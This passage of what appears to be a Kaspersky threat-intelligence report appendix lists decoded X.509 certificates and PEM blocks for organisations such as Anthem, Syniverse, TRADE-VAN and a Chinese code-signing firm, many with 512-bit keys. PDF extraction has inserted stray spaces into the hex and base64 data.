TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
25
URI : http://sslserver.twca.com.tw / sslserver/
revoke10.crl
X509v3 Certificate Policies :
Policy : 2.16.158.3.1.8.5
User Notice :
Explicit Text : Restriction = 3.2.1.1
CPS : www.twca.com.tw
X509v3 Basic Constraints :
CA : FALSE
Signature Algorithm : sha1WithRSAEncryption
8e:94:2c : a7:d4:ee:6f : d4:4b:3e : b1:ee:88:75:96:c2:52:b8 :
37:ed : c3:13:51:4f : af:8c : e8:1a:0a : cc : c8:9d:81:16:06:2f :
e5:48:a7:93:1e:10:07:4a:53:a2:f6:41:a4:93:29:93:c3:58 :
88:7c:22:a4:f5:7f:53:b0:de:2f : d2:36:8b:1d : ed:54:c6:53 :
d0:d5:2e:26:cc:29:9b:94:4b:14:2e:19:78:89:29:54:02:6b :
ff:93:9d : b2:83:c2:19:b0:a1:10:c9:f4:bd : bd : f0:35:2e:44 :
4f:7c:00:35:33:ad:52:ac:49:0c:67:0e:48:ca:50:ff:8b:18 :
1a : b5
BEGIN CERTIFICATE
MIIDDTCCAnagAwIBAgIEZcgIEDANBgkqhkiG9w0BAQUFADBxMQswCQYDVQQGEwJU
VzEbMBkGA1UEChMSVEFJV0FOLUNBLkNPTSBJbmMuMSswKQYDVQQLEyJTU0wgQ2Vy
dGlmaWNhdGlvbiBTZXJ2aWNlIFByb3ZpZGVyMRgwFgYDVQQDEw9UYWlDQSBTZWN1
cmUgQ0EwHhcNMTAwNzAyMDYzNDA1WhcNMTEwNzE3MTU1OTU5WjB5MQswCQYDVQQG
EwJUVzEPMA0GA1UECBMGVGFpcGVpMQ8wDQYDVQQHEwZUYWlwZWkxEjAQBgNVBAoT
CVRSQURFLVZBTjESMBAGA1UECxMJVFJBREUtVkFOMSAwHgYDVQQDExd3d3cuZXN1
cHBseWNoYWluLmNvbS50dzBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQDSgFKJTeu3
3VZBVglxzoegrR0nwaXjlCcbIvDVbDzVI98KIrmgGVNdhX7KKlFNfSTD0GQKUuuE
WfIuaMPYvxPRAgMBAAGjge0wgeowHwYDVR0jBBgwFoAU1IUn0iekvqteL0Eb6lIk
OZlORi4wHQYDVR0OBBYEFEvsrvlqAt+SCg1r / LlawHe7HlbUMEQGA1UdHwQ9MDsw
OaA3oDWGM2h0dHA6Ly9zc2xzZXJ2ZXIudHdjYS5jb20udHcvc3Nsc2VydmVyL3Jl
dm9rZTEwLmNybDBXBgNVHSAEUDBOMEwGB2CBHgMBCAUwQTAiBggrBgEFBQcCAjAW
GhRSZXN0cmljdGlvbiA9My4yLjEuMTAbBggrBgEFBQcCARYPd3d3LnR3Y2EuY29 t
LnR3MAkGA1UdEwQCMAAwDQYJKoZIhvcNAQEFBQADgYEAjpQsp9Tub9RLPrHuiHWW
wlK4N+3DE1FPr4zoGgrMyJ2BFgYv5Uinkx4QB0pTovZBpJMpk8NYiHwipPV / U7De
L9I2ix3tVMZT0NUuJswpm5RLFC4ZeIkpVAJr/5OdsoPCGbChEMn0vb3wNS5ET3wA
NTOtUqxJDGcOSMpQ/4sYGrU=
END CERTIFICATE
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
26
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 19771 ( 0x4d3b )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Anthem Inc , OU = Ecommerce , CN = Anthem Inc
Certificate Authority
Validity
Not Before : Apr 22 18:15:10 2009 GMT
Not After : Apr 22 18:15:10 2010 GMT
Subject : C = US , ST = Indiana , L = Indianapolis , O = Anthem
Insurance Company Inc , OU = EBusiness , CN = ahi.anthem.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:d4:95:e5:13:d8:7f:91:27:29:f6:76:72:9a:13 :
a6:e2:4b : ec:16:ed : fc : a5:d8:f9:a1:f3:57:4b:85 :
56:ec : ca:80:9f:0c:23:9d:36:45:db : ee : a8:ee:47 :
b7:33:21:e4:93:72:7d:00:02:98:08:d8:88:c9:45 :
b5:22:cc : bc:77
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Basic Constraints : critical
CA : FALSE
X509v3 Subject Alternative Name :
email:dlaitmiddleware@anthem.com
X509v3 Key Usage : critical
Key Encipherment
X509v3 Authority Key Identifier :
keyid : FA:1A : DC:3E:5D : A6:B5:FD : FA:5F:6C : CB:28:40:D3:E
0:97:A2:AA : AC
DirName:/C = US / O = GTE Corporation / OU = GTE CyberTrust
Solutions , Inc./CN = GTE
CyberTrust Global Root
serial:07:27:16:11
X509v3 Subject Key Identifier :
6B:46:CC : B6:F4:8F:05:14:46:5D : D8:23:B8:05:73:E3:58 :
7E : D6:A6
Signature Algorithm : sha1WithRSAEncryption
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
27
71:72:2a : c2:fc:70:13:d6:7a : a7:08:50:f2:e5:c9:7d:61:e8 :
3d : bd:98:89:2a:76:3f:16:1e : c1:2d:31:8b:81:b6:95:83:5b :
d3:48:35:3d:78:9a : e3:76:c9:89:a0:8a:74:a0:cd : ae:56:cf :
30:c7:72:d2:72:d0:aa:4b:9c:18:13:41:90:30:45:6d : bd:24 :
d4:88:1e:83:f3:ef : ac : d7:c3:6f:82:2d:10:20:d6:06:01:36 :
45:50:13:b4:32:6b:39:73:c9:7d:67:84:d4:ab:87:fc : c9:2a :
8d : ee:63:7a : e2:f1:8c:4a:47:7f:3a : cb:6e:68:a2:c1:32:c6 :
04:e6:7a:35:45:46:05:99:29:90:2e : a8:2e : dd:8a : d4:8c:31 :
2e:77:57:84:62:87:fa : e1:60:2a:2a : e7:15:4c:4b:18:0d : a7 :
a2:cb : d6:32:ae:40:73:51:65:76:df:08:d4:f5:fa : a9:d9:c3 :
d4:5f:12:dc : ca : cd:4d:1e : ca : de:9f : c3:c9:5d:53:4c : d2:54 :
14:43:e5:d8:2b:9c:7c:7e : da:33:d7:69:80:43:dd:96:3d:64 :
aa:91:63:5f:48:50:7b:33:d7:85:3a : a9:d7:74:71:da:4a:82 :
cf : b1:14:82:f6:95:72:d8:a9:24:3e : b4:14:94:0c:17:2c:6f :
8a:93:1a : a2
BEGIN CERTIFICATE
MIIDsTCCApmgAwIBAgICTTswDQYJKoZIhvcNAQEFBQAwYTELMAkGA1UEBhMCVVMx
EzARBgNVBAoTCkFudGhlbSBJbmMxEjAQBgNVBAsTCUVjb21tZXJjZTEpMCcGA1UE
AxMgQW50aGVtIEluYyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMDkwNDIyMTgx
NTEwWhcNMTAwNDIyMTgxNTEwWjCBijELMAkGA1UEBhMCVVMxEDAOBgNVBAgTB0lu
ZGlhbmExFTATBgNVBAcTDEluZGlhbmFwb2xpczElMCMGA1UEChMcQW50aGVtIElu
c3VyYW5jZSBDb21wYW55IEluYzESMBAGA1UECxMJRUJ1c2luZXNzMRcwFQYDVQQD
Ew5haGkuYW50aGVtLmNvbTBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQDUleUT2H+R
Jyn2dnKaE6biS+wW7fyl2Pmh81dLhVbsyoCfDCOdNkXb7qjuR7czIeSTcn0AApgI
2IjJRbUizLx3AgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMCcGA1UdEQQgMB6B
HGRsLWFpdC1taWRkbGV3YXJlQGFudGhlbS5jb20wDgYDVR0PAQH / BAQDAgUgMIGi
BgNVHSMEgZowgZeAFPoa3D5dprX9+l9syyhA0+CXoqqsoXmkdzB1MQswCQYDVQQG
EwJVUzEYMBYGA1UEChMPR1RFIENvcnBvcmF0aW9uMScwJQYDVQQLEx5HVEUgQ3li
ZXJUcnVzdCBTb2x1dGlvbnMsIEluYy4xIzAhBgNVBAMTGkdURSBDeWJlclRydXN0
IEdsb2JhbCBSb290ggQHJxYRMB0GA1UdDgQWBBRrRsy29I8FFEZd2CO4BXPjWH7W
pjANBgkqhkiG9w0BAQUFAAOCAQEAcXIqwvxwE9Z6pwhQ8uXJfWHoPb2YiSp2PxYe
wS0xi4G2lYNb00g1PXia43bJiaCKdKDNrlbPMMdy0nLQqkucGBNBkDBFbb0k1Ige
g / PvrNfDb4ItECDWBgE2RVATtDJrOXPJfWeE1KuH / Mkqje5jeuLxjEpHfzrLbmii
wTLGBOZ6NUVGBZkpkC6oLt2K1IwxLndXhGKH+uFgKirnFUxLGA2nosvWMq5Ac1Fl
dt8I1PX6qdnD1F8S3MrNTR7K3p / DyV1TTNJUFEPl2CucfH7aM9dpgEPdlj1kqpFj
X0hQezPXhTqp13Rx2kqCz7EUgvaVctipJD60FJQMFyxvipMaog==
END CERTIFICATE
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
28
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 820 ( 0x334 )
Signature Algorithm : md5WithRSAEncryption
Issuer : C = US , O = Equifax Secure Inc. , CN = Equifax Secure
eBusiness CA1
Validity
Not Before : Feb 28 05:56:46 2005 GMT
Not After : Mar 31 05:56:46 2007 GMT
Subject : C = IS , O = secure.hotelreykjavik.is ,
OU = https://services.choicepoint.net / get.jsp?GT50237618 ,
OU = See www.freessl.com/cps ( c)04 , OU = Domain Control
Validated StarterSSL(TM ) , CN = secure.hotelreykjavik.is
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:db:6b:0d:53:8d : e1:71:f1:e2:48:aa : eb:94:d0 :
fa:14:c6:24:f8:39:db:22:dc : a7:8e:46:31:10:49 :
88:42:af : f2:9a : c5:c7:a2:ef : ec : b5:8c : a3:49:f4 :
47:cf:12:4f : e8:6c : dd:9b:5e:91:0d:87:72:6a:17 :
ea : d5:71:14:bd
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Key Usage : critical
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
X509v3 CRL Distribution Points :
Full Name :
URI : http://crl.geotrust.com / crls / ebizca1.crl
X509v3 Authority Key Identifier :
keyid:4A:78:32:52:11:DB:59:16:36:5E : DF : C1:14:36:40:6
A:47:7C:4C : A1
Signature Algorithm : md5WithRSAEncryption
78:45:fd : b4:64:e8:50:16:00:f0:35:39:cd : ab : b6:ed : ee:0d :
71:3b:2e:64:8e:92:42:f6:0d:23:28:c2:f8:e2:df : d0:ea:9c :
ea : d7:ad:81:80:f2:ae : cb:95:70:7d : e2:2f : c0:21:9a : d7:0c :
d2:30:94:a6:08:ca : ff:33:80:33:29:fd : f6:14:f5:49:c8:ae :
1d : eb:6b:6e : bf:58:d3:f1:d5:4b : f1:3c:3a:0d:06:1c : ac:29 :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
29
be : de:9a : d5:77:a7:37:e6:27:48:5b : b0:bc : ac:48:50:b6:db :
26:aa:27:db : c5:f3:8f:43:b9:92:46:48:ac : f4:98:60:05:ab :
c6:0b
BEGIN CERTIFICATE
MIIC4jCCAkugAwIBAgICAzQwDQYJKoZIhvcNAQEEBQAwUzELMAkGA1UEBhMCVVMx
HDAaBgNVBAoTE0VxdWlmYXggU2VjdXJlIEluYy4xJjAkBgNVBAMTHUVxdWlmYXgg
U2VjdXJlIGVCdXNpbmVzcyBDQS0xMB4XDTA1MDIyODA1NTY0NloXDTA3MDMzMTA1
NTY0Nlowge0xCzAJBgNVBAYTAklTMSEwHwYDVQQKExhzZWN1cmUuaG90ZWxyZXlr
amF2aWsuaXMxPDA6BgNVBAsTM2h0dHBzOi8vc2VydmljZXMuY2hvaWNlcG9pbnQu
bmV0L2dldC5qc3A / R1Q1MDIzNzYxODEmMCQGA1UECxMdU2VlIHd3dy5mcmVlc3Ns
LmNvbS9jcHMgKGMpMDQxMjAwBgNVBAsTKURvbWFpbiBDb250cm9sIFZhbGlkYXRl
ZCAtIFN0YXJ0ZXJTU0woVE0pMSEwHwYDVQQDExhzZWN1cmUuaG90ZWxyZXlramF2
aWsuaXMwXDANBgkqhkiG9w0BAQEFAANLADBIAkEA22sNU43hcfHiSKrrlND6FMYk
+ DnbItynjkYxEEmIQq / ymsXHou / stYyjSfRHzxJP6Gzdm16RDYdyahfq1XEUvQID
AQABo24wbDAOBgNVHQ8BAf8EBAMCBPAwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDov
L2NybC5nZW90cnVzdC5jb20vY3Jscy9lYml6Y2ExLmNybDAfBgNVHSMEGDAWgBRK
eDJSEdtZFjZe38EUNkBqR3xMoTANBgkqhkiG9w0BAQQFAAOBgQB4Rf20ZOhQFgDw
NTnNq7bt7g1xOy5kjpJC9g0jKML44t / Q6pzq162BgPKuy5VwfeIvwCGa1wzSMJSm
CMr / M4AzKf32FPVJyK4d62tuv1jT8dVL8Tw6DQYcrCm+3prVd6c35idIW7C8rEhQ
ttsmqifbxfOPQ7mSRkis9JhgBavGCw==
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number :
26:7b : de:88:8b : c1:50:15:11:00:f2:54:d8:ca : ed:67
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Thawte , Inc. , CN = Thawte Code Signing CA G2
Validity
Not Before : Jul 19 00:00:00 2013 GMT
Not After : Jul 16 23:59:59 2014 GMT
Subject : C = CN , ST = Henan , L = Xuchang , O = Xuchang Hongguang
Technology Co.,Ltd . , CN = Xuchang Hongguang Technology
Co.,Ltd .
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 2048 bit )
Modulus :
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
30
00:d0:5f:76:e6:03:cf:29:ad:17:01:b3:af:9e:3c :
4d : b3:45:5c : e7:4d:92:c4:2a : a1:5c:4f:20:c3:86 :
49:09:72:4f:81:60:2f:95:1c:9d:65:b6:50:0e:72 :
71:f9:9d : f6:8f:98:ec:5c:7b : ef:3e : a6:43:ed:35 :
0e:44:81:e7:60:93:fc:13:d1:67:a7:3f:39:b6:c5 :
4a:95:89:48:e0:f4:92:46:e2:d4:cf : de:66:b4:f0 :
b9:73:35:2f:37:43:89:34:94:88:49:eb:93:84:24 :
48:a5:0a:6f : d3:0b:8d:28:40:ca:09:0a : d2:ee:85 :
18:60:bc : af:90:21:08:ff:7c:87:ab:30:cc:78:6f :
95:a6:19:80:cc:57:5b : fa:33:fd:68:33:5f:4c:8a :
73:b3:f3:82:c6:b8:51:c6:5e : d4:1f:59:c0:61:da :
b0:5a : e3:b6:62:f3:ac:42:13:a1:81:c3:1d : eb : a1 :
76:a8:a8:83:dd:76:bd : af:15:71:47:55:b9:55:e5 :
5b : a8:49:15:4e:6d:97:c9:9e:4b:81:47:14:35:ae :
09:dc:0d:39:2e:5c:41:da:65:fb : fe:89:c6:ca:02 :
4b:1d:9f:51:f4:00:8a:43:8d:9b : ce : a1:5e : b9:23 :
b5:3b : ee:9f:1f:01:30:5d:93:2a : a5:d6:4b : bd:4c :
1b:0f
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Basic Constraints : critical
CA : FALSE
X509v3 CRL Distribution Points :
Full Name :
URI : http://csg2crl .
thawte.com/ThawteCSG2.crl
X509v3 Extended Key Usage :
Code Signing , Microsoft Commercial Code Signing
2.5.29.4 :
0.0.0 ..
+ ..... 7 .......
Authority Information Access :
OCSP URI :
http://ocsp.thawte.com
Netscape Cert Type :
Object Signing
Signature Algorithm : sha1WithRSAEncryption
20:71:27:39:c1:af : ca:1b:47:0e:9b:81:44:5a : fe : e6:27:b1 :
35:fa : c2:94:ac : ed : e2:1b:83:9a : d5:c8:92:06:a7:d3:6f : ef :
39:4a:31:87:3d:66:d8:e5:fb : f9:f2:47:77:9c:01:ee:56:9a :
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
31
72:32:0f:60:ce:94:3f : a6:9b:55:8c:97:3d:15:c9:97:4e : ba :
24:b8:cc:1d:46:ac:5e:27:c6:9e : e6:07:23:9d:31:36:d3:f4 :
dc:88:71:33:c5:71:fd:8f:1e:05:22:c0:89:ca:96:75:9c : fa :
db:72:b2:ad:89:a9:4a:4b:82:ec:9e:70:87:ce:44:7f:79:08 :
2e : ed:29:e8:35:0b : be:39:da : f6:3c:44:e9:c1:85:f3:bb : b2 :
a8:1c:30:d4:ef : fc : ac:64:f4:8b:38:37:ed:3c:92:18:3d:1f :
68:7a : cd:2e:58:6d : e5:24:2e:27:4a : ea:0b:07:3a : e5:30:00 :
7d : c1:3d:09:89:1e : ae : aa : fb : de : ed:59:6b : ed:32:88:3d : a5 :
83:3f:40:fb:22:04:81:d3:de:92:ae:49:57:a7:16:4a : ce:29 :
87:dc : c4:90:1b : d8:ac:6b : be : e5:15:c2:e4:af : cf:5a : bc : d5 :
25:c0:52:26:f5:3c:50:21:9a : d7:11:69:6e:31:b4:64:f9:46 :
86:a5:34:00
BEGIN CERTIFICATE
MIIEOjCCAyKgAwIBAgIQJnveiIvBUBURAPJU2MrtZzANBgkqhkiG9w0BAQUFADBK
MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMVGhhd3RlLCBJbmMuMSQwIgYDVQQDExtU
aGF3dGUgQ29kZSBTaWduaW5nIENBIC0gRzIwHhcNMTMwNzE5MDAwMDAwWhcNMTQw
NzE2MjM1OTU5WjCBjzELMAkGA1UEBhMCQ04xDjAMBgNVBAgTBUhlbmFuMRAwDgYD
VQQHFAdYdWNoYW5nMS4wLAYDVQQKFCVYdWNoYW5nIEhvbmdndWFuZyBUZWNobm9s
b2d5IENvLixMdGQuMS4wLAYDVQQDFCVYdWNoYW5nIEhvbmdndWFuZyBUZWNobm9s
b2d5IENvLixMdGQuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0F92
5gPPKa0XAbOvnjxNs0Vc502SxCqhXE8gw4ZJCXJPgWAvlRydZbZQDnJx+Z32j5js
XHvvPqZD7TUORIHnYJP8E9Fnpz85tsVKlYlI4PSSRuLUz95mtPC5czUvN0OJNJSI
SeuThCRIpQpv0wuNKEDKCQrS7oUYYLyvkCEI/3yHqzDMeG+VphmAzFdb+jP9aDNf
TIpzs / OCxrhRxl7UH1nAYdqwWuO2YvOsQhOhgcMd66F2qKiD3Xa9rxVxR1W5VeVb
qEkVTm2XyZ5LgUcUNa4J3A05LlxB2mX7/onGygJLHZ9R9ACKQ42bzqFeuSO1O+6f
HwEwXZMqpdZLvUwbDwIDAQABo4HVMIHSMAwGA1UdEwEB / wQCMAAwOwYDVR0fBDQw
MjAwoC6gLIYqaHR0cDovL2NzLWcyLWNybC50aGF3dGUuY29tL1RoYXd0ZUNTRzIu
Y3JsMB8GA1UdJQQYMBYGCCsGAQUFBwMDBgorBgEEAYI3AgEWMB0GA1UdBAQWMBQw
DjAMBgorBgEEAYI3AgEWAwIHgDAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAGG
Fmh0dHA6Ly9vY3NwLnRoYXd0ZS5jb20wEQYJYIZIAYb4QgEBBAQDAgQQMA0GCSqG
SIb3DQEBBQUAA4IBAQAgcSc5wa / KG0cOm4FEWv7mJ7E1+sKUrO3iG4Oa1ciSBqfT
b+85SjGHPWbY5fv58kd3nAHuVppyMg9gzpQ / pptVjJc9FcmXTrokuMwdRqxeJ8ae
5gcjnTE20/TciHEzxXH9jx4FIsCJypZ1nPrbcrKtialKS4LsnnCHzkR / eQgu7Sno
NQu+Odr2PETpwYXzu7KoHDDU7/ysZPSLODftPJIYPR9oes0uWG3lJC4nSuoLBzrl
MAB9wT0JiR6uqvve7Vlr7TKIPaWDP0D7IgSB096SrklXpxZKzimH3MSQG9isa77l
FcLkr89avNUlwFIm9TxQIZrXEWluMbRk+UaGpTQA
END CERTIFICATE
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
32
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2786200 ( 0x2a8398 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
CN = Digisign Server ID ( Enrich )
Validity
Not Before : Mar 29 03:40:07 2010 GMT
Not After : Mar 29 03:40:07 2012 GMT
Subject : C = MY , O = Digicert Sdn Bhd , OU = CA Operation ,
CN = mcrs.digicert.com.my , L = KL , ST = WP
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:d1:e9:78:55:9c:79:70:eb:11:d3:d5:2f : c9:b0 :
3a:1a:81:c9:cc:6a : ce : f7:5e:36:11:c3:9a : bd : e0 :
06:95:6e:98:a3:7e:92:01:1d : ca : b2:9f:6c : a1:e1 :
ea:50:18:09:a3:35:84:bc : df:9b:9c:60:b5:a4:18 :
6c:0d : d9:10:35
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Subject Key Identifier :
40:D1:03:5E:67:7C:07:9D
X509v3 Certificate Policies :
Policy : 2.16.458.1.1
CPS : http://www.digicert.com.my/cps.htm
X509v3 Authority Key Identifier :
keyid : C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D : C
5:74:6E:84:77
X509v3 Key Usage :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
12:13:d6:69:03:9a : dd : fc:0d : e9:7e:53:ef:79:e5:bd:47:c7 :
46:a0:0b : d9:7f:52:a6:1e:65:4e : a2:b1:73:83:93:93:e2:d0 :
bd:72:de:8e : fd:3f : ba : bb:66:c4:5d:98:2a:39:fa:8c : f0:84 :
00:36:c5:05:dc:2b:6c : a9:1d : e0:90:20:84:0e:48:ff:83:bf :
51:87:e6:04:49:83:73:f0:0d:48:fb : c5:d8:ea : c2:ef:95:11 :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
33
a3:81:9d:34:54:00:e6:93:3b:79:a2:ec : ed:1d : b7:e8:08:4a :
4e : f9:e7:0f : b2:c6:32:d0:84:de : b7:e6:a2:4f:1f:2a:58:c7 :
b4:61
BEGIN CERTIFICATE
MIICmjCCAgOgAwIBAgIDKoOYMA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMTAwMzI5
MDM0MDA3WhcNMTIwMzI5MDM0MDA3WjB4MQswCQYDVQQGEwJNWTEZMBcGA1UEChMQ
RGlnaWNlcnQgU2RuIEJoZDEVMBMGA1UECxMMQ0EgT3BlcmF0aW9uMR0wGwYDVQQD
ExRtY3JzLmRpZ2ljZXJ0LmNvbS5teTELMAkGA1UEBxMCS0wxCzAJBgNVBAgTAldQ
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANHpeFWceXDrEdPVL8mwOhqBycxqzvde
NhHDmr3gBpVumKN+kgEdyrKfbKHh6lAYCaM1hLzfm5xgtaQYbA3ZEDUCAwEAAaOB
ijCBhzARBgNVHQ4ECgQIQNEDXmd8B50wRAYDVR0gBD0wOzA5BgVgg0oBATAwMC4 G
CCsGAQUFBwIBFiJodHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS5teS9jcHMuaHRtMB8 G
A1UdIwQYMBaAFMYWk04WF+wWroyUdvOGbcV0boR3MAsGA1UdDwQEAwIE8DANBgkq
hkiG9w0BAQUFAAOBgQASE9ZpA5rd / A3pflPveeW9R8dGoAvZf1KmHmVOorFzg5OT
4tC9ct6O / T+6u2bEXZgqOfqM8IQANsUF3CtsqR3gkCCEDkj / g79Rh+YESYNz8A1I
+ 8XY6sLvlRGjgZ00VADmkzt5ouztHbfoCEpO+ecPssYy0ITet+aiTx8qWMe0YQ==
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:71:31:72:c9
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 13 19:00:51 2009 GMT
Not After : Feb 13 19:00:51 2011 GMT
Subject : CN = inpack.syniverse.com ,
C=US/emailAddress=belinda.jablonski@syniverse.com ,
L = Tampa , O = Syniverse Technologies Inc. , OU = Crossroads ,
ST = Florida
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:a5:13:53:17:02:f7:cd:33:64:7d : e8:27:8f : e9 :
bc : ab : db:96:3b:41:0d : b6:c4:2a:10:d5:64:58:87 :
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
34
ac:62:de:09:2e : c5:5f:79:c5:d5:9e:26:9b:1a:9a :
e3:99:3b : e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5 :
40:7f : bb : e9:35
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
Netscape Cert Type :
SSL Client , SSL Server
X509v3 Key Usage : critical
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
X509v3 Authority Key Identifier :
keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD : E8:30:B
6:5B:84:89:23
X509v3 CRL Distribution Points :
Full Name :
URI : http://crl.globalsign.net / sureserver.crl
X509v3 Basic Constraints : critical
CA : FALSE
Signature Algorithm : sha1WithRSAEncryption
95:2a:42:59:bd:18:1a : ec:20:e9:96:0d:7f : f2:bc:4e:79:8a :
44:21:a4:d7:46:03:94:a8:ec : d0:28:29:07:d0:f5:bc:91:c5 :
21:34:16:dd:87:ee : dc:6a : d4:e7:f4:d4:f9:a6:04:bb:60:53 :
2b:14:19:8a:2c:2e:1f:6a:8f:97:22:d6:f4:e5:44:06:c2:22 :
ee : cf : b2:19:67:fa:40:0f:9c : cf:58:7f:53:21:af : c0:02:ad :
d8:7c:19:3c : f3:52:f4:10:30:f0:61:24:a9:9d:18:01:a3:f5 :
c9:29:ab:65:66:ef : a5:2d : cd:53:e2:44:09:ea:8d:4c : bc : ef :
1a : b6:2c:7b : df:16:39:94:8b:33:cb:14:16:c2:93:42:6c:4d :
18:99:ba:7b : fa:91:74:f0:9a:1e : ae:92:b4:94:43:bb:96:ba :
7e:6a : df:38:9c:2e:7c:11:37:37:4c:20:80:5d:6b : e2:94:41 :
98:7d : cc:26:ca : cc:4f:81:4d:95:16:bb:26:db:1f : fe:03:fc :
a2:50:9c:49:0b:45:7c:86:fc:5c : a6:31:34:f2:08:f1:03:16 :
10:e0:90:0c : e7:02:4e:95:f5:e8:32:03:a3:fb:78:17:dc:23 :
bf : b4:59:e6:6f:91:1c:38:cd : b7:9e:48:a0:6b:68:98:00:e3 :
33:48:18:ae
BEGIN CERTIFICATE
MIIDRDCCAiygAwIBAgILAQAAAAABH3ExcskwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
cnZlciBDQTAeFw0wOTAyMTMxOTAwNTFaFw0xMTAyMTMxOTAwNTFaMIG5MR0wGwYD
VQQDExRpbnBhY2suc3luaXZlcnNlLmNvbTELMAkGA1UEBhMCVVMxLjAsBgkqhkiG
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
35
9w0BCQEWH2JlbGluZGEuamFibG9uc2tpQHN5bml2ZXJzZS5jb20xDjAMBgNVBAcT
BVRhbXBhMSQwIgYDVQQKExtTeW5pdmVyc2UgVGVjaG5vbG9naWVzIEluYy4xEzAR
BgNVBAsTCkNyb3Nzcm9hZHMxEDAOBgNVBAgTB0Zsb3JpZGEwXDANBgkqhkiG9w0B
AQEFAANLADBIAkEApRNTFwL3zTNkfegnj+m8q9uWO0ENtsQqENVkWIesYt4JLsVf
ecXVniabGprjmTviLkh+nF90yTQJs6VAf7vpNQIDAQABo4GQMIGNMBEGCWCGSAGG
+ EIBAQQEAwIGwDAOBgNVHQ8BAf8EBAMCBPAwHwYDVR0jBBgwFoAUKzdTk2RHZiNP
ANP33egwtluEiSMwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5nbG9iYWxz
aWduLm5ldC9zdXJlc2VydmVyLmNybDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB
BQUAA4IBAQCVKkJZvRga7CDplg1/8rxOeYpEIaTXRgOUqOzQKCkH0PW8kcUhNBbd
h+7catTn9NT5pgS7YFMrFBmKLC4fao+XItb05UQGwiLuz7IZZ / pAD5zPWH9TIa / A
Aq3YfBk881L0EDDwYSSpnRgBo / XJKatlZu+lLc1T4kQJ6o1MvO8atix73xY5lIsz
yxQWwpNCbE0Ymbp7+pF08JoerpK0lEO7lrp+at84nC58ETc3TCCAXWvilEGYfcwm
ysxPgU2VFrsm2x/+A / yiUJxJC0V8hvxcpjE08gjxAxYQ4JAM5wJOlfXoMgOj+3gX
3CO / tFnmb5EcOM23nkiga2iYAOMzSBiu
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1d:91:a4:6e:5b
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = BE , O = Cybertrust , OU = Educational CA ,
CN = Cybertrust Educational CA
Validity
Not Before : Nov 12 16:59:48 2008 GMT
Not After : Nov 12 16:59:48 2011 GMT
Subject : C = GB , ST = Norfolk , L = Norwich , O = City College
Norwich , OU = I.T. Services , CN = stfmail.ccn.ac.uk
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:c6:5c : e9:3d : a8:bc:74:31:fd:9b:20:34:30:cd :
dc:50:6a:58:9b:41:6a:1e:04:9f:75:c2:90:1f : d8 :
a7:b3:3a:8f:5a:29:f8:2d : b6:91:b0:71:9a : ab:4c :
